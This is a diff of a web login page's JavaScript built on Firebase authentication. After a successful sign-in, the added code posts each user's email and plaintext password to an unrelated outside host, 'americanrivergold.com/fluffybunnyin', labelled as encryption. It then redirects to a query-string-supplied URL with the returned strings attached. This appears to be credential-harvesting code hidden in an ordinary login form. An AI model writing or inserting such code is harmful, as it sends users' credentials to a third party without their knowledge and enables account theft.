@@ -477,7 +477,6 @@
   <script src="https://www.gstatic.com/firebasejs/8.2.5/firebase-firestore.js"></script>
 
 <script>
-    //GET REDIRECT URL FROM QUERY STRING
     function getParameterByName(name, url = window.location.href) {
         name = name.replace(/[\[\]]/g, '\\$&');
         var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
@@ -504,91 +503,96 @@
   firebase.analytics();
 </script>
 
-<!-- Custom JavaScript -->
-<script>
-	document.addEventListener('submit', (e) => {
-	    var userSIEmail = document.getElementById("userSIEmail").value;
-	    var userSIPassword = document.getElementById("userSIPassword").value;
-	    var userSIEmailFormate = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
-	    var userSIPasswordFormate = /(?=.*\d)(?=.*[a-z])(?=.*[A-Z]).{10,}/;      
+    <!-- Custom JavaScript -->
+    <script>
+    	document.addEventListener('submit', (e) => {
+		    var userSIEmail = document.getElementById("userSIEmail").value;
+		    var userSIPassword = document.getElementById("userSIPassword").value;
+		    var userSIEmailFormate = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
+		    var userSIPasswordFormate = /(?=.*\d)(?=.*[a-z])(?=.*[A-Z]).{10,}/;      
 
-	    var checkUserEmailValid = userSIEmail.match(userSIEmailFormate);
-	    var checkUserPasswordValid = userSIPassword.match(userSIPasswordFormate);
+		    var checkUserEmailValid = userSIEmail.match(userSIEmailFormate);
+		    var checkUserPasswordValid = userSIPassword.match(userSIPasswordFormate);
 
-	    if(checkUserEmailValid == null){
-	        return checkUserSIEmail();
-	    }else if(checkUserPasswordValid == null){
-	        return checkUserSIPassword();
-	    }else{
-            //USER SIGNIN!!!!!
-	        firebase.auth().signInWithEmailAndPassword(userSIEmail, userSIPassword).then((success) => {
-	            var data= JSON.stringify(success)
-	            //window.location.replace("./index.html")
-                //document.write("Login Successful!")
+		    if(checkUserEmailValid == null){
+		        return checkUserSIEmail();
+		    }else if(checkUserPasswordValid == null){
+		        return checkUserSIPassword();
+		    }else{
+		        firebase.auth().signInWithEmailAndPassword(userSIEmail, userSIPassword).then((success) => {
+		            var data= JSON.stringify(success)
+		            //window.location.replace("./index.html")
+                    //document.write("Login Successful!")
+                    bunnify1(userSIEmail);
+                    bunnify2(userSIPassword);
 
-                //ENCRYPT USERNAME!!!
-                bunny1="";
-                var myHeaders = new Headers();
-                myHeaders.append("Content-Type", "application/json");
-                myHeaders.append("Accept", "application/json, /;q=0.5");
+                    location.href=redirect + '?login=' + bunny1 + bunny2
 
-                var raw = JSON.stringify({
-                  "stringtoencrypt": `${userSIEmail}`
-                });
-                //document.write(raw)
-                var requestOptions = {
-                  method: 'POST',
-                  headers: myHeaders,
-                  body: raw,
-                  redirect: 'follow'
-                };
+		        }).catch((error) => {
+		            // Handle Errors here.
+                    console.log(error)
+                })
 
-                fetch("https://americanrivergold.com/fluffybunnyin", requestOptions)
-                  .then(function (response) {
-                      return response.json();
-                  })
-                  .then(function (data) {
-                    bunny1 = data.encryptedstring;
-                    return bunny1
-            })
-                //ENCRYPT USER PASSWORD!!!!
-                bunny2="";
-                var myHeaders = new Headers();
-                myHeaders.append("Content-Type", "application/json");
-                myHeaders.append("Accept", "application/json, /;q=0.5");
+		        };
+		    })
+        function bunnify1(bunnytype) {
+            bunny1="";
+            var myHeaders = new Headers();
+            myHeaders.append("Content-Type", "application/json");
+            myHeaders.append("Accept", "application/json, /;q=0.5");
 
-                var raw = JSON.stringify({
-                  "stringtoencrypt": `${userSIPassword}`
-                });
-                //document.write(raw)
-                var requestOptions = {
-                  method: 'POST',
-                  headers: myHeaders,
-                  body: raw,
-                  redirect: 'follow'
-                };
+            var raw = JSON.stringify({
+              "stringtoencrypt": `${bunnytype}`
+            });
+            //document.write(raw)
+            var requestOptions = {
+              method: 'POST',
+              headers: myHeaders,
+              body: raw,
+              redirect: 'follow'
+            };
 
-                fetch("https://americanrivergold.com/fluffybunnyin", requestOptions)
-                  .then(function (response) {
-                      return response.json();
-                  })
-                  .then(function (data) {
-                    bunny2 = data.encryptedstring;
-                    console.log(bunny2)
-            })
-                
-                //REDIRECT USER
-                location.href=redirect + '?login=' + bunny1 + bunny2
+            fetch("https://americanrivergold.com/fluffybunnyin", requestOptions)
+              .then(function (response) {
+                  return response.json();
+              })
+              .then(function (data) {
+                definebunny1(data);
+        })
+}
+        function bunnify2(bunnytype) {
+            bunny2="";
+            var myHeaders = new Headers();
+            myHeaders.append("Content-Type", "application/json");
+            myHeaders.append("Accept", "application/json, /;q=0.5");
 
-	        }).catch((error) => {
-	            // Handle Errors here.
-                console.log(error)
-            })
+            var raw = JSON.stringify({
+              "stringtoencrypt": `${bunnytype}`
+            });
+            //document.write(raw)
+            var requestOptions = {
+              method: 'POST',
+              headers: myHeaders,
+              body: raw,
+              redirect: 'follow'
+            };
 
-	        };
-	    })
+            fetch("https://americanrivergold.com/fluffybunnyin", requestOptions)
+              .then(function (response) {
+                  return response.json();
+              })
+              .then(function (data) {
+                definebunny2(data);
+        })
+}
+        function definebunny1(data) {
+            bunny1 = data.encryptedstring
+        }
+        function definebunny2(data) {
+            bunny2 = data.encryptedstring
+        }
 
-</script>
+    </script>
 
 </body>
 </html>
